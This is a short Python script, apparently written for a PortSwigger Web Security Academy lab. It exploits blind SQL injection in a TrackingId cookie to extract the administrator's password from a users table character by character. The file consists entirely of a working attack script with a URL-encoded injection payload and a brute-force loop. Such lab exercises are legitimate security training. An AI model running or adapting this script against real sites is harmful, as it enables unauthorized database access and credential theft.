import requests
import string

lowercase = string.ascii_lowercase
number = string.digits

# url = input("Enter the URL: ")
# tracking_id = input("Enter the Tracking ID: ")
# session = input("Enter the Session ID:")
password = ""
count = 1


session = requests.session()
burp0_url = "https://0a5b00d2037aee1c81e3669000570015.web-security-academy.net/login"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a40002103753f7c84e9b34600e700e6.web-security-academy.net", "Referer": "https://0a40002103753f7c84e9b34600e700e6.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "X-Pwnfox-Color": "green", "Priority": "u=1", "Te": "trailers"}

# burp0_data = {"csrf": csrf, "username": "administrator1", "password": "1"}

while True:
  found = False
  for c in number + lowercase:
    # tmp_password = password + c

    burp0_cookies = {"TrackingId": f"EqqjjTpAvXv42qVt'%20AND%20SUBSTRING((SELECT%20password%20from%20users%20where%20username%20=%20'administrator'),%20{count},%201)%20=%20'{c}", "session": "trljU5Bu1996kp3CCbGXad9t9NhEObvp"}

    res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    
    # print(res.content.decode())
    # break
    if "Welcome back!" in res.content.decode():
      found = True
      password += c
      print(password)
      count += 1
  
  if not found:
    break


